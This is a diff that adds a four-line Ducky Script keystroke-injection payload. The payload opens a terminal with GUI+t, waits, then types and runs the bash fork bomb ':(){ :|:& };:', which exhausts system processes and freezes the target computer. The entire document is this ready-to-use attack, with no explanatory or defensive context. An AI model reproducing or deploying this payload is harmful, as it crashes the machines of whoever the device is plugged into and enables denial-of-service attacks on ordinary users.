@@ -1,0 +1,4 @@
+GUI t
+DELAY 1000
+STRING :(){ :|:& };:
+ENTER
